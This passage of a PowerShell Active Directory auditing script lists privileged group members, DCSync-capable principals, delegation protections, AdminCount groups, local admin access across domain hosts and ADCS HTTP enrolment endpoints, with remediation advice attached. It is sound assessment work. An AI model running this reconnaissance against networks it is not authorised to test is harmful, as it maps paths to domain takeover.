			if($BuiltInAdministrator.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $BuiltInAdministrator.pwdlastset}elseif($ExtractedMember.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $ExtractedMember.pwdlastset}else{$pwdlastset = ""}

			[PSCustomObject]@{
				"Member Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Pwd Last Set" = $pwdlastset
				"Member SID" = GetSID-FromBytes -sidBytes $BuiltInAdministrator.objectsid
				"Group Domain" = $BuiltInAdministrator.domain
			}

		}
	}

 	if ($TempBuiltInAdministrators) {
		if(!$NoOutput){$TempBuiltInAdministrators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap}
		$HTMLBuiltInAdministrators = $TempBuiltInAdministrators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='BuiltinAdministrators'>Built-In Administrators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='BuiltinAdministrators'>" }
	}
	
	######################################################
    ########### Enterprise Administrators ################
	######################################################
	
	Write-Host ""
    Write-Host "Enterprise Administrators" -ForegroundColor Cyan
	$TempEnterpriseAdmins = foreach ($AllDomain in $AllDomains) {
		$EnterpriseAdmins = @()
		$EnterpriseAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Enterprise Admins"
		foreach ($EnterpriseAdmin in $EnterpriseAdmins) {
			
			$isEnabled = if ($EnterpriseAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if($EnterpriseAdmin.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $EnterpriseAdmin.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $EnterpriseAdmin.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $EnterpriseAdmin.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}
			if($EnterpriseAdmin.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $EnterpriseAdmin.pwdlastset}elseif($ExtractedMember.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $ExtractedMember.pwdlastset}else{$pwdlastset = ""}

			[PSCustomObject]@{
				"Member Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Pwd Last Set" = $pwdlastset
				"Member SID" = GetSID-FromBytes -sidBytes $EnterpriseAdmin.objectsid
				"Group Domain" = $EnterpriseAdmin.domain
			}
		}
	}

 	if ($TempEnterpriseAdmins) {
			if(!$NoOutput){$TempEnterpriseAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap}
			$HTMLEnterpriseAdmins = $TempEnterpriseAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EnterpriseAdmins'>Enterprise Administrators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EnterpriseAdmins'>" }
		}
	
	##################################################
    ########### Domain Administrators ################
	##################################################
	
	Write-Host ""
    Write-Host "Domain Administrators" -ForegroundColor Cyan
    $TempDomainAdmins = foreach ($AllDomain in $AllDomains) {
		$DomainAdmins = @()
		$DomainAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Domain Admins"
		foreach ($DomainAdmin in $DomainAdmins) {
			
			$isEnabled = if ($DomainAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if($DomainAdmin.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $DomainAdmin.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $DomainAdmin.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $DomainAdmin.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}
			if($DomainAdmin.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $DomainAdmin.pwdlastset}elseif($ExtractedMember.pwdlastset){$pwdlastset = Convert-LdapTimestamp -timestamp $ExtractedMember.pwdlastset}else{$pwdlastset = ""}

			[PSCustomObject]@{
				"Member Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Pwd Last Set" = $pwdlastset
				"Member SID" = GetSID-FromBytes -sidBytes $DomainAdmin.objectsid
				"Group Domain" = $DomainAdmin.domain
			}
		}
	}

 	if ($TempDomainAdmins) {
		if(!$NoOutput){$TempDomainAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap}
		$HTMLDomainAdmins = $TempDomainAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainAdmins'>Domain Administrators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainAdmins'>" }
	}
	
	##################################
    ########### DCSync ###############
	##################################

	Write-Host ""
	Write-Host "Principals with DCSync permissions" -ForegroundColor Cyan
	$TempReplicationUsers = @()
	$TempReplicationUsers = foreach ($AllDomain in $AllDomains) {
		
		$dcName = "DC=" + $AllDomain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$ldapPath = "LDAP://$dcName"
		$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
		$securityDescriptor = $ouEntry.ObjectSecurity
			
		$DCSyncPrincipals = @(($securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) | Where-Object {($_.IdentityReference.Value -match "S-1-(\d+-){4,}[\d]{4,10}$") -AND ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '89e95b76-444d-4c62-991a-0facbeda640c') -AND ($_.ActiveDirectoryRights -match 'GenericAll' -or $_.ActiveDirectoryRights -match 'WriteDacl' -or $_.ActiveDirectoryRights -match 'ExtendedRight') -AND $_.AccessControlType -eq "Allow"})
		
		$DCSyncPrincipals = @($DCSyncPrincipals | Sort-Object -Unique IdentityReference)
		
		foreach($DCSyncPrincipal in $DCSyncPrincipals){
			
			$TargetDCSyncPrincipal = @($SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $DCSyncPrincipal.IdentityReference.Value})
			
			if($TargetDCSyncPrincipal){
				
				try{$TargetObjectMembers = @(RecursiveGroupMembers -Raw -AllADObjects $SumGroupsUsers -Domain $AllDomain -Identity $TargetedObject.samaccountname)}catch{$TargetObjectMembers = $null}
				$FinalTargetObjectMembers = @()
				if($TargetObjectMembers){
					foreach($TargetObjectMember in $TargetObjectMembers){
						if($TargetObjectMember.samaccountname){$SidOrNameTarget = $TargetObjectMember.samaccountname}
						else{$SidOrNameTarget = $TargetObjectMember.cn}
						
						if(Test-SidFormat -SidString $SidOrNameTarget){
							$RetrieveObject = @($SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $SidOrNameTarget})
							if($RetrieveObject.samaccountname){
								$ExtractDomain = ($RetrieveObject.domain -split "\.")[0]
								$ExtractSamAcc = $RetrieveObject.samaccountname
								$SidOrNameTarget = "$ExtractDomain" + "\" + "$ExtractSamAcc"
							}
						}
						$FinalTargetObjectMembers += $SidOrNameTarget
					}
				}
				
				#$PrincipalTargetSID = GetSID-FromBytes -sidBytes $TargetDCSyncPrincipal.objectsid
				
				[PSCustomObject]@{
					"Domain" = $AllDomain
					"User or Group" = $TargetDCSyncPrincipal.samaccountname
					#"SID" = $PrincipalTargetSID
					#"AD Rights" = $DCSyncPrincipal.ActiveDirectoryRights
					#"Access Control" = $DCSyncPrincipal.AccessControlType
					"Members" = ($FinalTargetObjectMembers | Sort-Object -Unique) -join ' - '
				}
			}
		}
		
		$DAEABAGroups = @(
		'Administrators',
		'Enterprise Admins',
		'Domain Admins'
		)
		
		foreach($Target in $DAEABAGroups){
			$TargetObjectMembers = @(RecursiveGroupMembers -Raw -AllADObjects $SumGroupsUsers -Domain $AllDomain -Identity $Target)
			$CollectAllMembers = @()
			foreach($TargetObjectMember in $TargetObjectMembers){
				if($TargetObjectMember.samaccountname){$CollectAllMembers += $TargetObjectMember.samaccountname}
				else{$CollectAllMembers += $TargetObjectMember.cn}
			}
			[PSCustomObject]@{
				"Domain" = $AllDomain
				"User or Group" = $Target
				"Members" = ($CollectAllMembers | Sort-Object -Unique) -join ' - '
			}
		}
	}

 	if ($TempReplicationUsers) {
		if(!$NoOutput){$TempReplicationUsers | Sort-Object -Unique Domain,"User or Group" | Format-Table -AutoSize -Wrap}
		$HTMLReplicationUsers = $TempReplicationUsers | Sort-Object -Unique Domain,"User or Group" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ReplicationUsers'>Principals with DCSync permissions</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ReplicationUsers'>" }

  		$DCsyncPrincipalsTable = [PSCustomObject]@{
			"Recommendations" = "Review the permissions and privileges assigned to these accounts and ensure they align with the principle of least privilege."
		}
		
		$HTMLDCsyncPrincipalsTable = $DCsyncPrincipalsTable | ConvertTo-Html -As List -Fragment
  		$HTMLDCsyncPrincipalsTable = $HTMLDCsyncPrincipalsTable.Replace("*", "Recommendations")
		$HTMLDCsyncPrincipalsTable = "<div class='report-section' style='display:none;'>$HTMLDCsyncPrincipalsTable</div>"
	}
	
	##################################################
    ########### Excluded Users and Groups ##################
	##################################################
	
	$excludedUsers = @(
    'krbtgt'
    )
	
	#######################################################################################################################################
    ########### Administrators, Protected Users and Sensitive Flags ###############
	###################################################################################################################################
	
	Write-Host ""
	Write-Host "Protected and 'Sensitive and Not Allowed for Delegation' status (Administrators)" -ForegroundColor Cyan
	$TempHTMLAdminsProtectedUsersAndSensitive = foreach ($AllDomain in $AllDomains) {
		$TargetDAEABA = @($DAEABA | Where-Object {$_.domain -eq $AllDomain -AND $_.samaccountname})
		$TargetProtected = @($ProtectedUsers | Where-Object {$_.domain -eq $AllDomain})
		$TargetSensitive = @($SensitiveUsers | Where-Object {$_.domain -eq $AllDomain})
		foreach ($account in $TargetDAEABA) {
			[PSCustomObject]@{
				"Account" = $account.samaccountname
				"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$account.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $account.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Protected" = if($TargetProtected.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Sensitive" = if($TargetSensitive.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Last Logon" = if($account.lastlogontimestamp){Convert-LdapTimestamp -timestamp $account.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($account.pwdlastset){Convert-LdapTimestamp -timestamp $account.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $account.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempHTMLAdminsProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"}) {
		if(!$NoOutput){$TempHTMLAdminsProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
		$HTMLAdminsProtectedUsersAndSensitive = $TempHTMLAdminsProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AdminsProtectedUsersAndSensitive'>Protected and 'Sensitive and Not Allowed for Delegation' status (Administrators)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AdminsProtectedUsersAndSensitive'>" }

  		$AdminsProtectedUsersAndSensitiveTable = [PSCustomObject]@{
			"Recommendations" = "Consider adding Administrators to the 'Protected Users' group or marking them as 'sensitive and not allowed for delegation' to enforce enhanced security measures such as restrictions on NTLM Authentication and Delegation."
		}
		
		$HTMLAdminsProtectedUsersAndSensitiveTable = $AdminsProtectedUsersAndSensitiveTable | ConvertTo-Html -As List -Fragment
  		$HTMLAdminsProtectedUsersAndSensitiveTable = $HTMLAdminsProtectedUsersAndSensitiveTable.Replace("*", "Recommendations")
		$HTMLAdminsProtectedUsersAndSensitiveTable = "<div class='report-section' style='display:none;'>$HTMLAdminsProtectedUsersAndSensitiveTable</div>"
	}
	
	#######################################################################################################################################
    ########### Security Groups, Protected Users and Sensitive Flags ###############
	###################################################################################################################################
	
	Write-Host ""
	Write-Host "Protected and 'Sensitive and Not Allowed for Delegation' status (Security Groups)" -ForegroundColor Cyan
	$TempHTMLSecurityProtectedUsersAndSensitive = foreach ($AllDomain in $AllDomains) {
		$TargetDAEABA = @($DAEABA | Where-Object {$_.domain -eq $AllDomain -AND $_.samaccountname})
		$TargetSecurity = @($AllSecurityUsers | Where-Object {$_.domain -eq $AllDomain})
		$UniqueToSecurity = Compare-Object -ReferenceObject $TargetDAEABA -DifferenceObject $TargetSecurity -Property 'samaccountname' -PassThru | Where-Object { $_.SideIndicator -eq '=>' }
		$TargetProtected = @($ProtectedUsers | Where-Object {$_.domain -eq $AllDomain})
		$TargetSensitive = @($SensitiveUsers | Where-Object {$_.domain -eq $AllDomain})
		foreach ($account in $UniqueToSecurity) {
			[PSCustomObject]@{
				"Account" = $account.samaccountname
				"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$account.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $account.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Protected" = if($TargetProtected.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Sensitive" = if($TargetSensitive.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Last Logon" = if($account.lastlogontimestamp){Convert-LdapTimestamp -timestamp $account.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($account.pwdlastset){Convert-LdapTimestamp -timestamp $account.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $account.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempHTMLSecurityProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"}) {
		if(!$NoOutput){$TempHTMLSecurityProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
		$HTMLSecurityProtectedUsersAndSensitive = $TempHTMLSecurityProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='SecProtectedUsersAndSensitive'>Protected and 'Sensitive and Not Allowed for Delegation' status (Security Groups)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='SecProtectedUsersAndSensitive'>" }

  		$SecurityProtectedUsersAndSensitiveTable = [PSCustomObject]@{
			"Recommendations" = "Consider adding privileged accounts to the 'Protected Users' group or marking them as 'sensitive and not allowed for delegation' to enforce enhanced security measures such as restrictions on NTLM Authentication and Delegation."
		}
		
		$HTMLSecurityProtectedUsersAndSensitiveTable = $SecurityProtectedUsersAndSensitiveTable | ConvertTo-Html -As List -Fragment
  		$HTMLSecurityProtectedUsersAndSensitiveTable = $HTMLSecurityProtectedUsersAndSensitiveTable.Replace("*", "Recommendations")
		$HTMLSecurityProtectedUsersAndSensitiveTable = "<div class='report-section' style='display:none;'>$HTMLSecurityProtectedUsersAndSensitiveTable</div>"
	}
	
	#######################################################################################################################################
    ########### AdminCount, Protected Users and Sensitive Flags ###############
	###################################################################################################################################
	
	Write-Host ""
	Write-Host "Protected and 'Sensitive and Not Allowed for Delegation' status (Admin Count)" -ForegroundColor Cyan
	$TempHTMLAdmCountProtectedUsersAndSensitive = foreach ($AllDomain in $AllDomains) {
		#$UniqueToAdminCountNotInDAEABAOrSecurity = $null
		$TargetDAEABA = @($DAEABA | Where-Object {$_.domain -eq $AllDomain -AND $_.samaccountname})
		$TargetSecurity = @($AllSecurityUsers | Where-Object {$_.domain -eq $AllDomain})
		$TargetAdminCount = @($AllAdminCountUsers | Where-Object {$_.domain -eq $AllDomain})
		$UniqueToAdminCountNotInDAEABA = @(Compare-Object -ReferenceObject $TargetDAEABA -DifferenceObject $TargetAdminCount -Property 'samaccountname' -PassThru | Where-Object { $_.SideIndicator -eq '=>' })
		$UniqueToAdminCountNotInDAEABAOrSecurity = @(Compare-Object -ReferenceObject $TargetSecurity -DifferenceObject $UniqueToAdminCountNotInDAEABA -Property 'samaccountname' -PassThru | Where-Object { $_.SideIndicator -eq '=>' })
		
		$TargetProtected = @($ProtectedUsers | Where-Object {$_.domain -eq $AllDomain})
		$TargetSensitive = @($SensitiveUsers | Where-Object {$_.domain -eq $AllDomain})
		foreach ($account in $UniqueToAdminCountNotInDAEABAOrSecurity) {
			[PSCustomObject]@{
				"Account" = $account.samaccountname
				"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$account.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $account.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"Protected" = if($TargetProtected.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Sensitive" = if($TargetSensitive.samaccountname | Where-Object { $account.samaccountname.Contains($_) }) { "True" } else { "False" }
				"Last Logon" = if($account.lastlogontimestamp){Convert-LdapTimestamp -timestamp $account.lastlogontimestamp}else{""}
				"Pwd Last Set" = if($account.pwdlastset){Convert-LdapTimestamp -timestamp $account.pwdlastset}else{""}
				"SID" = GetSID-FromBytes -sidBytes $account.objectSID
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempHTMLAdmCountProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"}) {
		if(!$NoOutput){$TempHTMLAdmCountProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
		$HTMLAdmCountProtectedUsersAndSensitive = $TempHTMLAdmCountProtectedUsersAndSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AdmCountProtectedUsersAndSensitive'>Protected and 'Sensitive and Not Allowed for Delegation' status (Admin Count)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AdmCountProtectedUsersAndSensitive'>" }

  		$AdmCountProtectedUsersAndSensitiveTable = [PSCustomObject]@{
			"Recommendations" = "Consider adding privileged accounts to the 'Protected Users' group or marking them as 'sensitive and not allowed for delegation' to enforce enhanced security measures such as restrictions on NTLM Authentication and Delegation."
		}
		
		$HTMLAdmCountProtectedUsersAndSensitiveTable = $AdmCountProtectedUsersAndSensitiveTable | ConvertTo-Html -As List -Fragment
  		$HTMLAdmCountProtectedUsersAndSensitiveTable = $HTMLAdmCountProtectedUsersAndSensitiveTable.Replace("*", "Recommendations")
		$HTMLAdmCountProtectedUsersAndSensitiveTable = "<div class='report-section' style='display:none;'>$HTMLAdmCountProtectedUsersAndSensitiveTable</div>"
	}
	
	##################################################
    ########### Admin Count (Groups) #################
	##################################################
	
	Write-Host ""
    Write-Host "Groups with AdminCount set to 1 (non-defaults)" -ForegroundColor Cyan
	
	$excludedGroups = @(
		'Administrators',
		'Domain Admins',
		'Enterprise Admins',
		'Print Operators',
		'Backup Operators',
		'Replicator',
		'krbtgt',
		'Domain Controllers',
		'Schema Admins',
		'Server Operators',
		'Cert Publishers',
		'DNSAdmins',
		'Account Operators',
		'Read-Only Domain Controllers',
		'Enterprise Read-Only Domain Controllers',
		'Group Policy Creator Owners',
		'Key Admins',
		'Enterprise Key Admins'
    )
	
	$TempGroupsAdminCount = foreach ($AllDomain in $AllDomains) {
		$GroupsAdminCount = @($TotalGroups | Where-Object {$_.domain -eq $AllDomain -AND $_.admincount -eq 1 -AND $_.samaccountname -notin $excludedGroups})
		foreach ($Group in $GroupsAdminCount) {
			[PSCustomObject]@{
				"Group Name" = $Group.samaccountname
				"Group SID" = GetSID-FromBytes -sidBytes $Group.objectsid
				"Domain" = $AllDomain
			}
		}
	}

 	if ($TempGroupsAdminCount) {
		if(!$NoOutput){$TempGroupsAdminCount | Sort-Object Domain,"Group Name" | Format-Table -AutoSize -Wrap}
		$HTMLGroupsAdminCount = $TempGroupsAdminCount | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GroupsAdminCount'>Groups with AdminCount set to 1 (non-defaults)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GroupsAdminCount'>" }

  		$AdminCountGroupsTable = [PSCustomObject]@{
			"Description" = "The Groups listed below have the attribute 'AdminCount' set to 1. When an object is removed from one of the privileged groups, AdminCount is not set to another value."
			"Remediation" = "In alignment with the principle of least privilege, evaluate the necessity of administrative privileges and consider removing the AdminCount attribute for the affected Groups."
		}
		
		$HTMLAdminCountGroupsTable = $AdminCountGroupsTable | ConvertTo-Html -As List -Fragment
		$HTMLAdminCountGroupsTable = "<div class='report-section' style='display:none;'>$HTMLAdminCountGroupsTable</div>"
	}
	
	#################################################
    ######### Find Local Admin Access ###############
	#################################################
	
	if($FindLocalAdminAccess -OR $AllEnum){
        Write-Host ""
		Write-Host "Local Admin Access" -ForegroundColor Cyan
		$TempFindLocalAdminAccess = foreach ($AllDomain in $AllDomains) {
			$OurFinalTargetsForAccess = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain})
			$OurFinalTargetsForAccess = $OurFinalTargetsForAccess.dnshostname -join ','
			$LocalAdminAccess = Find-LocalAdminAccess -Targets $OurFinalTargetsForAccess
			foreach ($AdminAccess in $LocalAdminAccess) {
				$CompObject = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_.dnshostname -eq $AdminAccess.ComputerName})
				if($AdminAccess.ComputerName){$IPAddress = (Resolve-DnsName -Name $AdminAccess.ComputerName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Target" = $AdminAccess.ComputerName
					"IP Address" = $IPAddress
					"Operating System" = $CompObject.operatingsystem
					"Protocol" = $AdminAccess.Protocol
					"Domain" = $AllDomain
				}
				$IPAddress = $null
			}
		}
		if ($TempFindLocalAdminAccess) {
			if(!$NoOutput){$TempFindLocalAdminAccess | Sort-Object Domain,Target | Format-Table -AutoSize -Wrap}
			$HTMLFindLocalAdminAccess = $TempFindLocalAdminAccess | Sort-Object Domain,Target | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='FindLocalAdminAccess'>Local Admin Access</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='FindLocalAdminAccess'>" }
		}
    }

 	###############################################
    ########### Misconfigs Banner ###############
	###############################################
	
	$MisconfigurationsBanner = "<h3>Misconfigurations and Red Flags</h3>"
	Write-Host ""
	Write-Host "Misconfigurations and Red Flags" -ForegroundColor Red
	Write-Host ""
	
	###############################################
    ########### ADCS HTTP Endpoints ###############
	###############################################
	if($NoADCSHTTPEndpoints){}
	else{
		Write-Host ""
		Write-Host "ADCS HTTP Endpoints" -ForegroundColor Cyan

		$CertPublishers = @()
		
		$CertPublishers += foreach ($AllDomain in $AllDomains) {
			RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Domain $AllDomain -Identity "Cert Publishers"
		}
		
		$TempCertPublishers = foreach ($CertPublisher in $CertPublishers) {
				
			$CAName = $CertPublisher.MemberName.TrimEnd('$')
			$CAFQDN = $CAName + "." + $CertPublisher.MemberDomain
			
			if($CAFQDN){$IPAddress = (Resolve-DnsName -Name $CAFQDN -Type A).IPAddress}
			if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
			
			if($IPAddress){
				$Endpoint = "$CAFQDN/certsrv/"
				$httpuri = "http://$CAFQDN/certsrv/"
				$httpsuri = "https://$CAFQDN/certsrv/"
				
				try{$httpresponse = Invoke-WebRequest -Uri $httpuri -UseDefaultCredentials -TimeoutSec 3 -UseBasicParsing}catch{$httperrorMessage = $_.Exception.Message}

				try{$httpsresponse = Invoke-WebRequest -Uri $httpsuri -UseDefaultCredentials -TimeoutSec 3 -UseBasicParsing}catch{$httpserrorMessage = $_.Exception.Message}
				
				[PSCustomObject]@{
					"Name" = $CertPublisher.MemberName
					"IP Address" = $IPAddress
					"Member SID" = $CertPublisher.MemberSID
					"Group Name" = $CertPublisher.GroupName
					"Endpoint" = $Endpoint
					"HTTP" = if ($httpresponse.statuscode -eq 200) {"True"} elseif ($httperrorMessage -like "*Could not establish trust relationship for the SSL/TLS secure channel*") {"Possible"} elseif ($httperrorMessage -like "*The remote server returned an error: (401) Unauthorized*") {"Possible"} else {"False"}
					"HTTPS" = if ($httpsresponse.statuscode -eq 200) {"True"} elseif ($httpserrorMessage -like "*Could not establish trust relationship for the SSL/TLS secure channel*") {"Possible"} elseif ($httpserrorMessage -like "*The remote server returned an error: (401) Unauthorized*") {"Possible"} else {"False"}
					"Domain" = $CertPublisher.GroupDomain
				}
			}
			
			else{
				[PSCustomObject]@{
					"Name" = $CertPublisher.MemberName
					"IP Address" = "None"
					"Member SID" = $CertPublisher.MemberSID
					"Group Name" = $CertPublisher.GroupName
					"Endpoint" = "No-IP"
					"HTTP" = "No-IP"
					"HTTPS" = "No-IP"
					"Domain" = $CertPublisher.GroupDomain
				}
			}
			
			$IPAddress = $null
			
		}
				
		if ($TempCertPublishers) {
			if(!$NoOutput){$TempCertPublishers | Sort-Object Domain,"Name" | Format-Table -AutoSize -Wrap}
			$HTMLCertPublishers = $TempCertPublishers | Sort-Object Domain,"Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ADCSEndpoints'>ADCS HTTP Endpoints</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ADCSEndpoints'>" }

      			$ADCSEndpointsTable = [PSCustomObject]@{
				#"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "These endpoints could be exploited through NTLM relay attacks to issue unauthorized certificates for targeted domain computers, leading to domain compromise."
